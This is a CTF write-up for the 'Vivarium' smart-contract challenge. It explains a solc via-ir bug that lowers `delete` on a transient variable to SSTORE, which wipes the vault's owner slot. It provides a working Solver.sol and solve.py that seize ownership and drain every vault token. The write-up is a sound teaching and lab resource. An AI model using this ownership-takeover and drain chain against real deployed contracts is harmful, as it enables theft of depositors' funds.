# Vivarium

25<sup>th</sup> April 2026

Prepared By: `Axlnich`

Challenge Author(s): `Axlnich`

Difficulty: Medium

<br>

# Synopsis

In this challenge, you must exploit a compiler-level transient storage bug (present in solc 0.8.28–0.8.33 when `via-ir` is enabled) to zero out the `owner` slot and seize full administrative control of `PrivateYieldVault`. First, join the vault club and deposit USDC to acquire shares, then fully unwind your position via `requestRedeem` and `redeem` so you become the last (tail) member. Call `multicall` with five batched operations: `finalizeExit` removes you from the member list and issues an exit settlement ticket, `settleEpoch` validates the ticket and then executes `delete _executionContext` — which the buggy compiler incorrectly lowers to `SSTORE(3, 0)` instead of `TSTORE(3, 0)`, silently zeroing the persistent `owner` slot (storage slot 3). `setOwnership` notices `owner == address(0)` and lets the caller claim it, `pauseVault` freezes the vault, and `ownerEmergencyWithdraw` drains every last VIVM token to the attacker. The challenge is solved once `Setup.isSolved()` returns `true` (i.e., `assetToken.balanceOf(address(proxy)) == 0`).


## Description

VIVARIUM is the financial backbone of Directorate 9's cyber campaign, a members-only on-chain yield vault holding VIVM reserves off the global ledger and beyond sanction. These funds keep Gilded Weaver in the field. Breach it, find the flaw, and empty the vault.

## Skill Required

- Solidity & EVM storage layout (slot numbering for state vs. transient variables, delegatecall context)
- Transient storage (`TSTORE`/`TLOAD`, EIP-1153, transaction-scoped lifetime)
- UUPS-style proxy pattern (`VaultProxy`, delegatecall, shared storage layout)
- Compiler internals (solc `via-ir` pipeline, how the IR lowering of `delete` on transient variables incorrectly emits `SSTORE`)
- ERC-4626-style vault mechanics (shares, redemption lifecycle, membership gating)
- Foundry / Python web3 scripting (Anvil, py-solc-x, contract deployment, chained transactions)
- Exploit scripting (deploying a Solver contract, funding it, chaining vault calls atomically via multicall)

## Skills Learned

- Identifying compiler-level storage aliasing bugs (transient slot N == persistent slot N under the wrong codegen path)
- Mapping a contract's full storage layout — both regular and transient — to locate overlapping slots
- Exploiting `delete` on transient storage as a vector that corrupts persistent storage (ownership slot)
- Chaining multi-step vault lifecycle operations (join → deposit → redeem → exit → settle → claim ownership → drain) inside a single `multicall`
- Leveraging a paused-vault emergency path (`ownerEmergencyWithdraw`) as the final drain primitive after seizing ownership
- Fingerprinting compiler versions by inspecting artifact metadata and recognizing vulnerable build configurations
- Environment mastery (spawning local chain instances, using `isSolved()` as a termination oracle)


# Enumeration

## Analyzing the Source Code

When unzipping the challenge, the Solidity source code is found in the `challenge/src/setup/` directory. The codebase is a **UUPS-style proxy** (`VaultProxy`) that `delegatecall`s into a `PrivateYieldVault` implementation, backed by a custom ERC-20 token (`VivariumToken`). All vault state — including `owner`, share balances, and the transient execution context — lives in the proxy's storage. The win condition is purely token-based: `Setup.isSolved()` returns `true` when the proxy holds **zero VIVM tokens**. Below is a detailed breakdown of each contract and the single compiler-level vulnerability that makes the drain possible.

---

### `Setup.sol`

**Purpose.** Deploys and wires all contracts, seeds initial state, exposes the win condition.

**Wiring & bootstrap.**

* Instantiates `VivariumToken`, `PrivateYieldVault` (implementation), and `VaultProxy`.
* Calls `VaultProxy` constructor with `PrivateYieldVault.initialize` encoded as init calldata; this delegatecalls into the implementation and sets all persistent fields (owner = Setup, asset = VIVM, feeRecipient = Setup, minimumDeposit = 100 USDC, membershipFee = 10 USDC, withdrawalFeeBps = 50).
* Mints 1,000,000 VIVM to itself and 220 VIVM to the player.
* Calls `joinClub()`, `deposit(400 USDC)`, `injectYield(20 USDC)`, and `notifyRewardYield(12 USDC)` — establishing Setup as the sole member and depositor, with ~432 USDC locked in the proxy at start.

**Player lifecycle.**

* Player receives 220 USDC at construction and is never added as a member automatically.
* `isSolved()` returns `true` if `assetToken.balanceOf(address(proxy)) == 0`.

---

### `VivariumToken.sol`

**Purpose.** Custom ERC-20 asset token ("Vivarium", ticker "VIVM", 6 decimals).

**Key design.**

* `mint()` is restricted: only the deployer address (stored as the immutable `_minter`) may call it. Setup is the deployer, so no one else can mint.
* Transfer and approval mechanics are standard OZ ERC-20.
* The 6-decimal precision matches USDC-like amounts used throughout the vault.

---

### `VaultProxy.sol`

**Purpose.** Lightweight UUPS-style proxy; all external calls are forwarded to the implementation via `delegatecall`.

**Mechanics.**

* Constructor validates the implementation address (non-zero, has code), stores it as an `immutable`, and immediately `delegatecall`s the provided `initCalldata` — this executes `initialize()` in the proxy's storage context.
* `fallback()` and `receive()` both call `_delegate()`, which copies calldata, runs `delegatecall` to the immutable implementation, and bubbles the result or revert.
* There is no upgrade mechanism; the implementation address is fixed at construction.

**Implication.** All storage written during `initialize()` and all subsequent vault calls lives in the **proxy's** storage. The implementation contract's own storage is never touched during normal operation.

---

### `PrivateYieldVault.sol`

**Purpose.** Core vault logic — membership, deposits, redemptions, yield distribution, epoch settlement, and owner-gated emergency functions.

**Storage layout (critical slots).**

Regular (persistent) storage variables, in declaration order:

| sSlot | Variable |
|------|----------|
| 0 | `protocolVersion` |
| 1 | `vaultFlags` |
| 2 | `lastSettledEpoch` |
| **3** | **`owner`** ← target |
| 4 | `asset` |
| 5 | `feeRecipient` |
| 6 | `totalShares` |
| 7 | `accruedProtocolFees` |
| 8 | `rewardReserveAssets` |
| 9 | `rewardShareSupply` |
| … | … |

Transient storage variables (EIP-1153, `transient` keyword), in declaration order:

| tSlot | Variable |
|-------|----------|
| 0 | `_previewAssets` |
| 1 | `_previewShares` |
| 2 | `_pendingFee` |
| **3** | **`_executionContext`** ← aliases slot 3 |
| 4 | `_pendingReceiver` |
| 5 | `_feeRecipientHint` |
| 6 | `_operationDigest` |
| 7 | `_exitSettlementTicket` |
| 8 | `_exitSettlementNonce` |
| 9 | `_multicallActive` |

**Key functions.**

* `joinClub()` — pays `membershipFee` from caller, adds caller to `_members`, sets `isMember[caller] = true`.
* `deposit(assets, receiver)` — `onlyMember`, mints proportional shares, records lifetime deposits.
* `requestRedeem(shares)` — `onlyMember`, queues a pending redemption.
* `redeem(shares, receiver)` — `onlyMember`, burns shares, transfers proportional assets minus withdrawal fee.
* `finalizeExit()` — `onlyMember`, validates caller has fully exited (zero shares, zero pending redeem, no pending rewards), removes caller from the tail of `_members`, sets `_exitSettlementNonce = 1` and stores a settlement ticket in `_exitSettlementTicket`.
* `settleEpoch()` — validates `_multicallActive`, validates `_exitSettlementNonce == 1` and the settlement ticket, emits an event, then calls **`delete _executionContext`** — **the vulnerability**.
* `setOwnership()` — `onlyOwner`, sets `owner = msg.sender`.
* `pauseVault()` — `onlyOwner`, sets `paused = true`.
* `ownerEmergencyWithdraw(to, amount)` — `onlyOwner`, requires vault to be `paused`, transfers `amount` of asset to `to`.
* `multicall(data[])` — sets `_multicallActive = true`, then `delegatecall`s each element against `address(this)` in sequence; reverts on any failure.

**`onlyOwner` modifier — intentional red herring.**

```solidity
modifier onlyOwner() {
    if (msg.sender != owner) {
        if (owner != address(0)) revert NotOwner();
        owner = msg.sender;
    }
    _;
}
```

The nested-if structure looks like a claim-if-unowned path, but it is only reachable **after** the TSTORE bug zeros `owner`. Under normal operation (owner set to Setup), the outer condition is true and the inner immediately reverts `NotOwner`. This structure is a red herring designed to make the ownership claim appear exploitable through a code path that seems intentional, obscuring its true dependency on the compiler bug.

**`settleEpoch()` — the bug site.**

```solidity
function settleEpoch() external whenNotPaused nonReentrant {
    if (!_multicallActive) revert NotInMulticall();
    // ... validation ...
    _executionContext = msg.sender;
    // ... emit ...
    delete _executionContext;   // ← BUG: SSTORE(3, 0) not TSTORE(3, 0)
}
```

---

### `Errors.sol`

**Purpose.** Centralized custom error definitions referenced by `PrivateYieldVault`.

Contains all access-control, initialization, amount, membership, redemption, exit, and proxy errors. The presence of `NotInMulticall` confirms that `settleEpoch()` is explicitly gated to multicall context — a structural enforcement that also means the exploit **must** use `multicall` to reach the bug site.

---

### Summary

* **Single entrypoint:** All vault interactions go through `VaultProxy.fallback`, which `delegatecall`s into `PrivateYieldVault`.
* **ERC-20-only accounting:** All value flows are VIVM tokens. No ETH.
* **Membership gate:** All non-owner write functions require `isMember[msg.sender] == true`.
* **Exit lifecycle:** `finalizeExit` enforces a strict ordering — zero shares, zero pending, caller must be the tail member — before issuing a settlement ticket.
* **Multicall enforcement:** `settleEpoch` can only be called inside `multicall` (via `_multicallActive` transient flag).
* **The invariant that breaks:** The compiler assumes `delete` on a `transient` variable emits `TSTORE(slot, 0)`. Under solc 0.8.28–0.8.33 with `via-ir`, it instead emits `SSTORE(slot, 0)`. Because transient slot 3 and persistent slot 3 are the same numeric index, `delete _executionContext` silently zeroes the `owner` field.


# Solution

## Finding the Vulnerability

**In `PrivateYieldVault.sol` (storage slot collision):**

The contract declares both persistent and transient variables. The Solidity compiler assigns slot indices to each class independently, both starting from 0. Counting by declaration order:

* Persistent slot 3 → `owner` (4th declared: `protocolVersion`, `vaultFlags`, `lastSettledEpoch`, `owner`)
* Transient slot 3 → `_executionContext` (4th declared: `_previewAssets`, `_previewShares`, `_pendingFee`, `_executionContext`)

These two slot indices are numerically identical. Under correct codegen, `TSTORE(3, v)` and `SSTORE(3, v)` target different storage spaces and do not interfere. The bug is in the **compiler**, not the contract logic.

---

**The TSTORE poison bug (solc 0.8.28–0.8.33, `via-ir`):**

A bug in the `via-ir` compilation pipeline causes `delete` on a `transient` variable to emit `SSTORE` instead of `TSTORE`. The relevant Solidity Foundation disclosure is:

> When a helper function is introduced for clearing transient state storage, the compiler may emit `SSTORE` (persistent storage clear) instead of `TSTORE`, due to a collision in the clearing helper selection logic.

References:
- https://hexens.io/research/solidity-compiler-bug-tstore-poison
- https://www.soliditylang.org/blog/2026/02/18/transient-storage-clearing-helper-collision-bug/

In `settleEpoch()`:

```solidity
delete _executionContext;
```

The compiler lowers this to `SSTORE(3, 0)` instead of `TSTORE(3, 0)`. Because persistent slot 3 is `owner`, this silently overwrites the vault's owner address with zero — **within the same transaction** that called `settleEpoch`.

---

**In `onlyOwner` modifier (claim path after zero):**

```solidity
modifier onlyOwner() {
    if (msg.sender != owner) {
        if (owner != address(0)) revert NotOwner();
        owner = msg.sender;
    }
    _;
}
```

After `owner` becomes `address(0)`:

1. `msg.sender != owner` → `true` (any non-zero address)
2. `owner != address(0)` → `false` (owner was zeroed)
3. `owner = msg.sender` executes → caller is now owner

This path is **only reachable** because `settleEpoch` wiped `owner` via the compiler bug. Without the bug, `owner` is always the Setup contract address and the inner `revert NotOwner()` fires for any non-owner caller.

---

**In `ownerEmergencyWithdraw` (drain primitive):**

```solidity
function ownerEmergencyWithdraw(address to, uint256 amount) external onlyOwner nonReentrant {
    if (!paused) revert NotPaused();
    if (to == address(0)) revert ToZero();
    // ...
    _safeTransfer(asset, to, amount);
}
```

Once the attacker is owner and has paused the vault, this function transfers an arbitrary amount of asset tokens to any address — including the full vault balance.

---

### The Exploit Flow

1. Deploy a `Solver` contract and fund it with ≥ 110 USDC (10 membership fee + ≥ 100 minimum deposit).
2. Solver calls `joinClub()` → pays 10 USDC membership fee, becomes the **last (tail) member** in `_members`.
3. Solver calls `deposit(100 USDC, address(this))` → acquires shares.
4. Solver calls `requestRedeem(shares)` → queues full redemption.
5. Solver calls `redeem(shares, address(this))` → burns all shares, receives assets back minus fee.
6. Solver calls `vault.multicall([...])` with five operations in sequence:
   - **`finalizeExit()`** — validates Solver has zero shares, zero pending, is tail member; pops Solver from `_members`; sets `_exitSettlementNonce = 1` and writes settlement ticket to `_exitSettlementTicket`.
   - **`settleEpoch()`** — validates `_multicallActive` and the settlement ticket; emits event; executes `delete _executionContext` which (due to the bug) writes `SSTORE(3, 0)`, zeroing `owner`.
   - **`setOwnership()`** — `onlyOwner` fires: `msg.sender != owner` (true), `owner != 0` (false), so `owner = msg.sender` runs. Solver contract is now owner.
   - **`pauseVault()`** — `onlyOwner`, sets `paused = true`.
   - **`ownerEmergencyWithdraw(msg.sender, totalBalance)`** — `onlyOwner`, vault is paused, transfers all VIVM to `msg.sender` (the player).
7. `Setup.isSolved()` returns `true`: `assetToken.balanceOf(proxy) == 0`.

---

## Exploitation

The exploit is delivered in two files: `Solver.sol` (the on-chain executor) and `solve.py` (the off-chain orchestrator).

---

### `Solver.sol` — On-chain executor

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

contract Solver {
    address public immutable setupAddr;

    constructor(address _setupAddr) {
        setupAddr = _setupAddr;
    }

    function solve() external {
        ISetup setup = ISetup(setupAddr);
        address proxyAddr = setup.proxy();
        IVault vault = IVault(proxyAddr);
        IERC20 token = IERC20(setup.assetToken());

        token.approve(proxyAddr, type(uint256).max);

        vault.joinClub();

        uint256 depositAmt = token.balanceOf(address(this));
        vault.deposit(depositAmt, address(this));

        uint256 shares = vault.shareBalance(address(this));
        vault.requestRedeem(shares);
        vault.redeem(shares, address(this));

        bytes[] memory calls = new bytes[](5);
        calls[0] = abi.encodeCall(IVault.finalizeExit, ());
        calls[1] = abi.encodeCall(IVault.settleEpoch, ());
        calls[2] = abi.encodeCall(IVault.setOwnership, ());
        calls[3] = abi.encodeCall(IVault.pauseVault, ());
        calls[4] = abi.encodeCall(
            IVault.ownerEmergencyWithdraw,
            (msg.sender, token.balanceOf(proxyAddr))
        );

        vault.multicall(calls);
    }
}
```

**Line-by-line breakdown.**

* `token.approve(proxyAddr, ...)` — grants the vault unlimited pull authority over Solver's VIVM balance. `joinClub` and `deposit` both call `transferFrom(msg.sender, ...)` internally.

* `vault.joinClub()` — pays the 10 USDC membership fee, adds Solver to the end of `_members`. Solver is now the **tail** member (required by `finalizeExit`).

* `vault.deposit(depositAmt, address(this))` — deposits the remaining VIVM balance. Solver must hold at least `minimumDeposit` (100 USDC) after the membership fee is deducted.

* `vault.requestRedeem(shares)` + `vault.redeem(shares, address(this))` — fully unwinds Solver's position. After redeem, `shareBalance[solver] == 0` and `redeemRequests[solver].shares == 0`. This satisfies `finalizeExit`'s `SharesRemain` and `RedeemPending` guards.

* `vault.multicall(calls)` — executes the five batched delegatecalls atomically:
  - `finalizeExit()` validates all exit preconditions, pops Solver from `_members`, and writes the settlement ticket to transient storage.
  - `settleEpoch()` validates `_multicallActive` and the ticket, emits the event, and executes `delete _executionContext` — which the buggy compiler emits as `SSTORE(3, 0)`, zeroing persistent slot 3 (`owner`).
  - `setOwnership()` sees `owner == address(0)` inside `onlyOwner`, writes `owner = msg.sender` (Solver contract), and emits `OwnershipSet`.
  - `pauseVault()` sets `paused = true` as the new owner.
  - `ownerEmergencyWithdraw(msg.sender, token.balanceOf(proxyAddr))` — vault is paused and Solver is owner; transfers the **entire proxy token balance** to `msg.sender` (the player EOA).

---

### `solve.py` — Off-chain orchestrator

```python
#!/usr/bin/env python3
# Usage: python solve.py --rpc <RPC_URL> --privkey <PLAYER_PRIVKEY> --setup <SETUP_ADDR>
```

The Python script handles everything outside the chain: compiling `Solver.sol` with the correct settings, deploying it, funding it with VIVM, and calling `solve()`.

#### 1) Compile with matching settings

```python
SOLC_VER = "0.8.33"

def _compile_solver() -> tuple[list, bytes]:
    install_solc(SOLC_VER)
    set_solc_version(SOLC_VER)

    out = compile_standard({
        "language": "Solidity",
        "sources": {"Solver.sol": {"content": source}},
        "settings": {
            "evmVersion": "cancun",
            "viaIR": True,
            "optimizer": {"enabled": True},
            "outputSelection": {"*": {"*": ["abi", "evm.bytecode.object"]}},
        },
    }, solc_version=SOLC_VER)
```

**Why these settings matter:** `viaIR: True` and `solc_version "0.8.33"` ensure the Solver is compiled with the same toolchain as the vault, activating the transient-storage codegen path. The `cancun` EVM version is required for the `TSTORE`/`TLOAD` opcodes.

#### 2) Deploy Solver

```python
deploy_tx = _build(
    web3,
    web3.eth.contract(abi=abi, bytecode=bytecode).constructor(setup_addr),
    player, nonce, chain_id,
)
receipt = _send(web3, deploy_tx, args.privkey)
solver_addr = receipt.contractAddress
```

#### 3) Fund Solver with 110 USDC

```python
fund_tx = _build(
    web3,
    token.functions.transfer(solver_addr, 110 * 10**6),  # 10 join fee + 100 deposit
    player, nonce, chain_id,
)
_send(web3, fund_tx, args.privkey)
```

110 USDC is sufficient: 10 USDC covers the `membershipFee`, and the remaining 100 USDC meets the `minimumDeposit`. The player starts with 220 USDC so they retain 110 USDC after funding.

#### 4) Call solve()

```python
solver = web3.eth.contract(address=solver_addr, abi=abi)
solve_tx = _build(web3, solver.functions.solve(), player, nonce, chain_id)
_send(web3, solve_tx, args.privkey)
```

#### 5) Verify

```python
if setup.functions.isSolved().call():
    print("\n[+] *** Challenge SOLVED! isSolved() == true ***")
```

---

### Running the solver

```bash
python htb/solve.py \
  --rpc     http://<host>:<port>/rpc/<uuid> \
  --privkey <PLAYER_PRIVKEY> \
  --setup   <SETUP_ADDR>
```

All three values are returned by the `/api/launch` endpoint when you deploy a challenge instance.

---

### Getting the flag

After `solve()` executes and `isSolved()` returns `true`:

* Click the **[ EXTRACT FLAG ]** button on the challenge instance page, **or**
* Fetch it directly:

```bash
curl http://<host>:<port>/api/flag/<uuid>
```

**Flag:** `HTB{REDACTED}`

---

## References

- Hexens Research — Solidity Compiler Bug: TSTORE Poison: https://hexens.io/research/solidity-compiler-bug-tstore-poison
- Solidity Foundation Security Advisory — Transient Storage Clearing Helper Collision Bug: https://www.soliditylang.org/blog/2026/02/18/transient-storage-clearing-helper-collision-bug/
